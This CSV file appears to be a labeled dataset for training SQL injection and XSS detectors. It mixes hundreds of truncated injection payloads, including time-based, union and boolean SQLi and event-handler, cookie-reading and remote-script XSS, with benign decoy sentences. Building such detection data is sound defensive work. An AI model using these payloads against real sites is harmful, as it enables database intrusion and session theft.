Payload,Label,text_label,ID
1' ) ) ) and 3754 = ( select upper ( xmltype ( chr,2,SQLi,22309
Create a unique sculpture.,0,normal,22684
""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20",2,SQLi,10884
1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- ,2,SQLi,11173
select * from users where id = 1 <@$_ or 1 = 1 -- ,2,SQLi,11815
1 ) ) and 9198 = 9198--,2,SQLi,17310
<style>:target {color: red;}</style><a id=x style=,1,XSS,3271
1'+ ( select vohg where 6383 = 6383 and 6055 = ctx,2,SQLi,20670
"<u oncut=""alert(1)"" contenteditable>test</u>",1,XSS,2814
1' ) ) ) and 9198 = 9198--,2,SQLi,19837
"document.getElementsByClassName(""example"")",1,XSS,3689
"1"" union all select null,null,null#",2,SQLi,13122
) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AN,2,SQLi,11191
"1 union all select null,null,null,null,null,null,n",2,SQLi,12589
"1"" where 5927 = 5927",2,SQLi,22333
<style onreadystatechange=alert(1)></style>,1,XSS,8745
"According to 9to5Mac, here's how to solve your pro",0,normal,26413
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,13562
<img2 onpointerup=alert(1)>XSS</img2>,1,XSS,4128
"-9858"" or 8592 = 8553",2,SQLi,16713
1 ) as ezje where 5234 = 5234 and make_set ( 8403 ,2,SQLi,21107
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ",2,SQLi,14278
1'+ ( select 'ixza' where 4374 = 4374 union all se,2,SQLi,21189
â><<script>alert(document.cookie);//<</script>,1,XSS,1135
"<basefont onmouseleave=""alert(1)"">test</basefont>",1,XSS,5291
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10659
"<var draggable=""true"" ondragstart=""alert(1)"">test<",1,XSS,5963
Try our homemade Greek yogurt on organic muesli or,0,normal,25234
select ( case when ( 9455 = 6007 ) then 9455 else ,2,SQLi,12323
"<div oncontextmenu=""alert(1)"">test</div>",1,XSS,7470
"select count ( * ) from generate_series ( 1,500000",2,SQLi,21806
`'><script>\xC2\xA0javascript:alert(537)</script>,1,XSS,8975
"-3364%"" ) ) ) union all select 5464--",2,SQLi,13013
"admin"" ) or ""1"" = ""1",2,SQLi,11601
-2820' ) ) or 6679 = 8848--,2,SQLi,17825
"1' union all select null,null,null,null,null,null,",2,SQLi,18879
admin' or 1 = 1,2,SQLi,11669
"<cite onmouseup=""alert(1)"">test</cite>",1,XSS,3611
"1 ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706",2,SQLi,12839
"1"" ) ) ) union all select null,null,null,null,null",2,SQLi,16600
"javascript:alert()//'//""//`//></a></option></selec",1,XSS,9529
Tinder Select has been around for almost six month,0,normal,25284
"-1064' or make_set ( 6439 = 2937,2937 ) and 'qojd'",2,SQLi,12128
1 rlike ( select * from ( select ( sleep ( 5 ) ) ),2,SQLi,18623
<area id=x tabindex=1 onbeforeactivate=alert(1)></,1,XSS,4612
"<style>@keyframes x{}</style><rp style=""animation-",1,XSS,8521
1'|| ( select 'adoe' from dual where 7662 = 7662,2,SQLi,15484
"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""f",1,XSS,439
<cite onpointerout=alert(1)>XSS</cite>,1,XSS,5293
"1%"" ) ) and exp ( ~ ( select * from ( select conca",2,SQLi,15667
<button onRowsEnter=javascript:alert(1)>,1,XSS,9662
Where's the desert?,0,normal,23520
"<nobr oncontextmenu=""alert(1)"">test</nobr>",1,XSS,2067
Find and select a TV show or movie to play. 3.,0,normal,26195
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20d",2,SQLi,10905
You can also save $50 on select Fire HD 8 Tablet.,0,normal,25102
"-3756' ) union all select 1034,1034,1034--",2,SQLi,13660
""" Look for ""The New York Times"" and select ""Enable",0,normal,26475
Select dish.,0,normal,24534
Pete Najarian was a buyer of the Financial Select ,0,normal,25780
"-6760 or 1570 = convert ( int, ( select char ( 113",2,SQLi,22461
<nextid onpointerdown=alert(1)>XSS</nextid>,1,XSS,4206
<button onKeyPress=javascript:alert(1)>,1,XSS,9623
"<colgroup onbeforecopy=""alert(1)"" contenteditable>",1,XSS,3620
I'll select my groomsmen's attire.,0,normal,24414
<style>:target {transform: rotate(180deg);}</style,1,XSS,4222
"-1258"" ) ) union all select 7734,7734,7734#",2,SQLi,21769
Select hatch.,0,normal,24750
1 ) or sleep ( __TIME__ ) #,2,SQLi,11490
select ( case when ( 6287 = 8341 ) then 6287 else ,2,SQLi,21976
<style>:target {transform: rotate(180deg);}</style,1,XSS,8731
"UNION ALL SELECT 1,2,3,4,5,6,7,8",2,SQLi,10510
Let's choose a destination for our next trip.,0,normal,23848
<button onpointerleave=alert(1)>XSS</button>,1,XSS,8135
"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( (",2,SQLi,21914
Where's the concert?,0,normal,23581
"<style>:target {color:red;}</style><s id=x style=""",1,XSS,4773
1'+ ( select gblp where 6768 = 6768,2,SQLi,18820
\xE2\x81\x9Fjavascript:javascript:confirm(1),1,XSS,9483
1' ) ) ) and ( select 2* ( if ( ( select * from ( ,2,SQLi,19416
"{""id"":null,""name"":""Gastly""}",0,normal,27559
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5751
"1"" ) and sleep ( 5 ) and ( ""ytof"" = ""ytof",2,SQLi,15550
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4293
Select your succeed.,0,normal,25008
"<nav onmouseleave=""alert(1)"">test</nav>",1,XSS,3025
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10657
1' in boolean mode ) ( select ( case when ( 5451 =,2,SQLi,17193
"<SCRIPT a="">'>"" SRC=""httx://xss.rocks/xss.js""></SC",1,XSS,309
<summary id=x tabindex=1 onbeforedeactivate=alert(,1,XSS,4848
; if is_srvrolemember('sysadmin') > 0 waitfor dela,2,SQLi,11137
Guys are seriously starting to understand that the,0,normal,26498
"UNION ALL SELECT 1,2,3,4#",2,SQLi,10536
"1"" and 6510 = ( select count ( * ) from sysusers a",2,SQLi,13329
all,0,normal,23181
1' ) ) ) and 4069 = 8786 and ( ( ( 'eftr' = 'eftr,2,SQLi,20336
<time onpointerout=alert(1)>XSS</time>,1,XSS,5115
"-1550' in boolean mode ) union all select 9777,977",2,SQLi,19647
"<A HREF=""http://ha.ckers.org@google""></A>",1,XSS,1773
1' ) and 5556 = ( select count ( * ) from all_user,2,SQLi,13184
Select the correct answer from the options.,0,normal,24044
"1"" ) or 4411 = ( select count ( * ) from sysusers ",2,SQLi,14974
Search records where valid.,0,normal,23311
"<script src=""#"">{alert(1)}</script>;1",1,XSS,1125
"select * from users where id = 1 or "".,"" or 1 = 1 ",2,SQLi,11498
"<nav onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,6890
"1%"" union all select null,null,null,null,null,null",2,SQLi,13144
1' ) where 3588 = 3588,2,SQLi,18079
Filter the spam folder.,0,normal,22715
<xss onpointerleave=alert(1) style=display:block>X,1,XSS,89
"<form draggable=""true"" ondragend=""alert(1)"">test</",1,XSS,1872
Can you help me decide where to take a hike?,0,normal,23725
"<?a foo=x=`y><img alt=""`><img src=xx:x onerror=ale",1,XSS,9041
"<IMG SRC=x onended=""alert(String.fromCharCode(88,8",1,XSS,1224
"1 ) ) and row ( 6237,7469 ) > ( select count ( * )",2,SQLi,18732
-7772' ) ) or 9323 = 9323#,2,SQLi,16753
"-8205' or elt ( 6581 = 3480,3480 ) and 'sosv' = 's",2,SQLi,21937
"<;DIV STYLE="";background-image:\0075\0072\006C\002",1,XSS,1637
Let's decide where to go for a weekend adventure.,0,normal,23683
"1"" and ( 3020 = 3020 ) *6703 and ""tnzp"" like ""tnzp",2,SQLi,19687
"<div STYLE=""width: expression(document.vulnerable=",1,XSS,1506
<listing onpointerover=alert(1)>XSS</listing>,1,XSS,2529
"1%"" and 4595 = 4595#",2,SQLi,15920
-2783%' ) ) or 4144 = ( select upper ( xmltype ( c,2,SQLi,21336
"{""id"":null,""firstName"":""Catherine"",""lastName"":""Hie",0,normal,26790
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input ,1,XSS,2036
1' ) as ohnu where 4097 = 4097 union all select nu,2,SQLi,20235
"1%"" ) ) order by 1--",2,SQLi,19816
1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) |,2,SQLi,17407
"<listing onbeforepaste=""alert(1)"" contenteditable>",1,XSS,4688
"{""id"":null,""name"":""Venusaur""}",0,normal,27086
select ( case when ( 2783 = 9216 ) then 1 else 278,2,SQLi,18116
1'+ ( select 'nmhy' where 2919 = 2919 and 8189 = (,2,SQLi,15173
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=da",1,XSS,995
"<style></style\x20<img src=""about:blank"" onerror=j",1,XSS,448
"<rt oncopy=""alert(1)"" contenteditable>test</rt>",1,XSS,7949
1,0,normal,26693
"<listing draggable=""true"" ondragleave=""alert(1)"">t",1,XSS,4016
"select * from users where id = 1 or ""? ( "" or 1 = ",2,SQLi,11390
"iif ( 9190 = 5059,1,1/0 )",2,SQLi,12642
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10483
Select awe.,0,normal,24731
1' where 8945 = 8945 and 6240 = ( 'qqpjq'|| ( sele,2,SQLi,21763
<dialog id=x tabindex=1 ondeactivate=alert(1)></di,1,XSS,6955
"-9740"" ) ) as pxkx where 5305 = 5305 or 1 group by",2,SQLi,20557
1'|| ( select 'zxla' from dual where 7634 = 7634 a,2,SQLi,16071
<map onpointerdown=alert(1)>XSS</map>,1,XSS,6424
<bdi id=x tabindex=1 onbeforeactivate=alert(1)></b,1,XSS,5536
"1"" ) ) ) or 8315 = ( select count ( * ) from sysib",2,SQLi,12562
Let's find out where the historical site is.,0,normal,23794
select * from users where id = 1. <@ union select ,2,SQLi,11915
<style onpointerleave=alert(1)>XSS</style>,1,XSS,2416
<slot id=x tabindex=1 onactivate=alert(1)></slot>,1,XSS,7630
Where's the villa?,0,normal,23568
"-3261"" ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, (",2,SQLi,19636
Select the ideal lighting for your photos.,0,normal,24039
<i id=x tabindex=1 onbeforeactivate=alert(1)></i>,1,XSS,5186
select * from users where id = 1 or \+<\ union sel,2,SQLi,11835
<noscript onpointerenter=alert(1)>XSS</noscript>,1,XSS,5030
1'|| ( select 'wgte' from dual where 6316 = 6316 a,2,SQLi,16471
The males appear to compete with each other in the,0,normal,25412
<command id=x tabindex=1 onbeforeactivate=alert(1),1,XSS,6295
Select your assignment.,0,normal,24851
1 where 7932 = 7932 or exp ( ~ ( select * from ( s,2,SQLi,16475
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=,1,XSS,1398
"<legend draggable=""true"" ondragstart=""alert(1)"">te",1,XSS,5613
"<fieldset draggable=""true"" ondragleave=""alert(1)"">",1,XSS,8298
<tbody onpointerleave=alert(1)>XSS</tbody>,1,XSS,2643
-7378' or 6872 = 6872 and 'bnmn' like 'bnmn,2,SQLi,19528
"-4223' ) ) ) union all select 7913,7913,7913,7913,",2,SQLi,20306
1 ) ) as xovu where 4530 = 4530 or 4411 = ( select,2,SQLi,18360
Where's the best place to capture memories?,0,normal,23857
"<style>@keyframes x{}</style><marquee style=""anima",1,XSS,8618
1 ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99,2,SQLi,12506
"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ",2,SQLi,14669
A Select Committee of the House of Commons had rec,0,normal,26422
"1, ( select ( case when ( 7616 = 7616 ) then 1 els",2,SQLi,12809
<svg><nextid onload=alert(1)></nextid>,1,XSS,7867
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6184
"1"" ) and 8677 = 9054#",2,SQLi,19124
"1 or ( select 9173 from ( select count ( * ) ,conc",2,SQLi,19017
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,5704
"<script/src=data:,alert()>",1,XSS,1149
"Williams-Sonoma: Up to 60% off select cutlery, up ",0,normal,25116
1'+ ( select lqhd where 4251 = 4251 and ( 8754 = 5,2,SQLi,16088
"1"" procedure analyse ( extractvalue ( 5840,concat ",2,SQLi,21231
"<iframe onmouseup=""alert(1)"">test</iframe>",1,XSS,7755
"{""id"":null,""firstName"":""Ddaania"",""lastName"":""Lisa""",0,normal,26963
") AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 13",2,SQLi,11290
Select a nice steady tempo; there is plenty of tim,0,normal,25657
Select the three dots at the top of the screen aga,0,normal,25578
"-5548' where 4477 = 4477 union all select 4477,447",2,SQLi,15668
"elt ( 2427 = 2427,5518 )",2,SQLi,19016
1' or 8421 = ( select count ( * ) from generate_se,2,SQLi,12764
1 and ( 5369 = 8325 ) *8325# psze,2,SQLi,18352
"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x71717",2,SQLi,17247
28 release in select U.S.,0,normal,26442
"-8791"" ) ) ) or make_set ( 6681 = 6620,6620 ) and ",2,SQLi,12396
<canvas id=x tabindex=1 onbeforedeactivate=alert(1,1,XSS,3889
1 ) ) as xcsm where 9231 = 9231,2,SQLi,20509
<basefont onblur=alert(1) tabindex=1 id=x></basefo,1,XSS,4692
<col onpointerup=alert(1)>XSS</col>,1,XSS,8050
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPA,1,XSS,9764
declare @q nvarchar (200) select @q = 0x7700610069,2,SQLi,10189
<rtc onpointerenter=alert(1)>XSS</rtc>,1,XSS,5661
<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>,1,XSS,7118
select * from users where id = '1' or $<\ or 1 = 1,2,SQLi,12000
1 ) ) and 3580 = ( select count ( * ) from domain.,2,SQLi,16797
"1%"" or 8421 = ( select count ( * ) from generate_s",2,SQLi,15733
"`>ABC<div style=""font-family:'foo'\x3Bx:expression",1,XSS,8955
<dialog id=x tabindex=1 onfocusin=alert(1)></dialo,1,XSS,8412
"<q onclick=""alert(1)"">test</q>",1,XSS,2960
"Click ""Check for updates"" and select the update if",0,normal,26283
Select a travel destination for an adventure.,0,normal,24240
<figure id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,5205
Select your mark.,0,normal,24896
<figcaption id=x tabindex=1 onbeforedeactivate=ale,1,XSS,7252
"feed:data:text/html,&#x3c;script>alert('Top Page L",1,XSS,9378
"1' ) ) and 4241 = convert ( int, ( select char ( 1",2,SQLi,16567
Select a coffee blend to enjoy.,0,normal,24242
1 and 9412 = 6877#,2,SQLi,14894
"<label onmouseover=""alert(1)"">test</label>",1,XSS,7612
"-1617%"" or 2724 in ( ( char ( 113 ) +char ( 113 ) ",2,SQLi,12762
Where did you find that fantastic recipe?,0,normal,23893
Select from 30 different games by scrolling throug,0,normal,25629
Where's your SQL job?,0,normal,23426
Sort the tangled wires on your desk.,0,normal,22967
Select deliver.,0,normal,24700
or 1=1#,2,SQLi,9973
1%' ) ) union all select null#,2,SQLi,15740
1 and sleep ( 5 ),2,SQLi,21915
Where's the database hosted?,0,normal,23383
select * from users where id = '1' union select +\,2,SQLi,11856
"<html oncontextmenu=""alert(1)"">test</html>",1,XSS,3860
1' ) as myxr where 6299 = 6299 and char ( 111 ) ||,2,SQLi,20505
"<bgsound draggable=""true"" ondragend=""alert(1)"">tes",1,XSS,6343
1%' ) ) and ( 8853 = 9924 ) *9924 and ( ( '%' = ',2,SQLi,17015
"{""id"":null,""name"":""buy""}",0,normal,27016
<svg><del onload=alert(1)></del>,1,XSS,2779
"make_set ( 6174 = 9734,1 )",2,SQLi,17717
like,0,normal,23134
1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (13,2,SQLi,11338
1 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,2,SQLi,16447
<button onAfterPrint=javascript:alert(1)>,1,XSS,9577
Select a color palette for the artwork.,0,normal,24231
"<style>@keyframes slidein {}</style><sub style=""an",1,XSS,2252
Save up to 25% on select grills and pool supplies,0,normal,25724
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2321
1' and 3580 = ( select count ( * ) from domain.dom,2,SQLi,18640
"<dd oncut=""alert(1)"" contenteditable>test</dd>",1,XSS,8061
"<keygen onmouseleave=""alert(1)"">test</keygen>",1,XSS,1878
<<SCRIPT>alert(âXSSâ);//<</SCRIPT>,1,XSS,937
1' and exp ( ~ ( select * from ( select concat ( 0,2,SQLi,12251
"1"" ) ) as etap where 8506 = 8506 union all select ",2,SQLi,21143
"{""id"":null,""firstName"":""Shirlyn"",""lastName"":""Fang""",0,normal,26898
"<noscript onbeforecut=""alert(1)"" contenteditable>t",1,XSS,8376
"{""id"":null,""name"":""Boldore""}",0,normal,27448
Select execute.,0,normal,24751
"<label draggable=""true"" ondragend=""alert(1)"">test<",1,XSS,8935
-2432' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'ejhp',2,SQLi,15553
-8447 where 2850 = 2850 or 7147 = 3262,2,SQLi,18525
"1"" ) as ebvt where 5305 = 5305",2,SQLi,19900
<svg><dfn onload=alert(1)></dfn>,1,XSS,7703
"-9135"" ) ) or 6872 = 6872 and ( ( ""fllx"" = ""fllx",2,SQLi,12381
"1"" ) ) as svim where 4924 = 4924 and 7932 = 5870",2,SQLi,20640
"<optgroup onkeypress=""alert(1)"" contenteditable>te",1,XSS,7278
"1 union all select null,null,null,null,null--",2,SQLi,14764
"When you download the app, you can select your gen",0,normal,25149
I want to choose a movie for movie night.,0,normal,23753
Select the perfect location.,0,normal,24322
<dir onfocusout=alert(1) tabindex=1 id=x></dir><in,1,XSS,5320
"<data draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,5688
1'||'asd'||',2,SQLi,22520
<blockquote onpointerdown=alert(1)>XSS</blockquote,1,XSS,7783
"<thead draggable=""true"" ondragenter=""alert(1)"">tes",1,XSS,3040
1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)# 1,2,SQLi,11180
<hr id=x tabindex=1 onfocus=alert(1)></hr>,1,XSS,2336
"1' ) or ( select 9173 from ( select count ( * ) ,c",2,SQLi,21885
))) waitfor delay '0:0:20' /*,2,SQLi,22493
"<script src=1 href=1 onerror=""javascript:alert(1)""",1,XSS,368
"<button onbeforecopy=""alert(1)"" contenteditable>te",1,XSS,7952
1'+ ( select qtyi where 7147 = 7147,2,SQLi,12988
"-6122"" ) union all select 6578,6578--",2,SQLi,14588
"{""id"":null,""firstName"":""Lalyn"",""lastName"":""Astorga",0,normal,27102
"1%' ) ) ) union all select null,null,null,null,nul",2,SQLi,21195
1%' ) ) order by 1#,2,SQLi,17093
<svg><command onload=alert(1)></command>,1,XSS,8199
"-3872%"" ) ) ) union all select 1637,1637,1637,1637",2,SQLi,18332
"<img\x32src=x onerror=""javascript:alert(1)"">",1,XSS,659
"1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 )",2,SQLi,20524
1'+ ( select qdon where 9453 = 9453,2,SQLi,12741
"1"" procedure analyse ( extractvalue ( 5840,concat ",2,SQLi,12931
1,0,normal,26744
"<keygen oncut=""alert(1)"" contenteditable>test</key",1,XSS,6922
"<style oncontextmenu=""alert(1)"">test</style>",1,XSS,8903
"<kbd onbeforecopy=""alert(1)"" contenteditable>test<",1,XSS,8544
javascript:alert()//\ /*<svg/onload=';alert();'></,1,XSS,9530
<button onMouseWheel=javascript:alert(1)>,1,XSS,9638
1' where 6147 = 6147 ( select ( case when ( 4587 =,2,SQLi,14937
"<menu oncopy=""alert(1)"" contenteditable>test</menu",1,XSS,8062
<style>:target {color: red;}</style><isindex id=x ,1,XSS,3827
Filter results where necessary.,0,normal,23441
"-7731"" ) ) or make_set ( 2551 = 4389,4389 ) and ( ",2,SQLi,14561
1%' ) ) rlike sleep ( 5 ) and ( ( '%' = ',2,SQLi,15463
Select this song.,0,normal,24801
<big onpointerenter=alert(1)>XSS</big>,1,XSS,8452
<blink id=x tabindex=1 onbeforeactivate=alert(1)><,1,XSS,6986
1'|| ( select 'ucxp' where 6612 = 6612 order by 1-,2,SQLi,16432
"<strong oncontextmenu=""alert(1)"">test</strong>",1,XSS,8132
Where's the table stored?,0,normal,23388
"<source onclick=""alert(1)"">test</source>",1,XSS,4408
1 ) or exp ( ~ ( select * from ( select concat ( 0,2,SQLi,21531
Insert the memory card.,0,normal,22630
"ABC<div style=""x:\xE3\x80\x80expression(javascript",1,XSS,469
1 ) ) and 8635 = ( select count ( * ) from generat,2,SQLi,18788
"<;IMG SRC="";http://www.thesiteyouareon.com/somecom",1,XSS,1597
"<IMG DYNSRC=""javascript:javascript:alert(1)"">",1,XSS,747
"{""id"":null,""firstName"":""Jey"",""lastName"":""Wood"",""sp",0,normal,27467
"{""id"":null,""name"":""happily""}",0,normal,26771
"<script>with(document.getElementById(""d""))innerHTM",1,XSS,9298
"Select Part Finder, which has a screw as its icon.",0,normal,25615
1 ) ) as hrks where 7637 = 7637 or elt ( 6272 = 62,2,SQLi,18697
"{""id"":null,""name"":""Arceus""}",0,normal,27227
"1%"" ) ) ) waitfor delay '0:0:5'--",2,SQLi,21310
"<details oncut=""alert(1)"" contenteditable>test</de",1,XSS,4986
"<html onpaste=""alert(1)"" contenteditable>test</htm",1,XSS,3461
select ( case when ( 7096 = 2568 ) then 7096 else ,2,SQLi,14338
You should select carefully.,0,normal,24467
The president can select appointees who align in t,0,normal,25393
"select * from generate_series ( 7237,7237,case whe",2,SQLi,17366
select,0,normal,26571
1%' or 7427 = dbms_pipe.receive_message ( chr ( 11,2,SQLi,20745
"1', ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 1",2,SQLi,22105
1' where 2661 = 2661,2,SQLi,22203
Select shock.,0,normal,24730
"{""id"":null,""firstName"":""Mona"",""lastName"":""Lim"",""ad",0,normal,27293
"<a href=""\x10javascript:javascript:alert(1)"" id=""f",1,XSS,504
<style>:target {color:red;}</style><noframes id=x ,1,XSS,6005
"<script src=""data:&comma;alert(1)//",1,XSS,9255
select ( case when ( 1868 = 5071 ) then 1 else 186,2,SQLi,18786
Modify code.,0,normal,23083
"<colgroup onbeforepaste=""alert(1)"" contenteditable",1,XSS,7171
"<b ondblclick=""alert(1)"">test</b>",1,XSS,5228
1 or 4411 = ( select count ( * ) from sysusers as ,2,SQLi,17438
select sleep ( 5 ) and ( ( ( 'etzb' = 'etzb,2,SQLi,21050
"-4329' ) union all select 1353,1353,1353,1353,1353",2,SQLi,21485
<select id=x tabindex=1 onbeforedeactivate=alert(1,1,XSS,8327
ORDER BY 15,2,SQLi,10319
1' ) as kqbh where 6138 = 6138,2,SQLi,22255
hi' or 'a' = 'a,2,SQLi,12027
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8354
"1' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d",2,SQLi,12804
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,3168
"Inspired by Le Select in Paris, The Select in Sand",0,normal,25986
Let's choose a venue for the party.,0,normal,23958
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11089
The following is a select list of genera of miscel,0,normal,25442
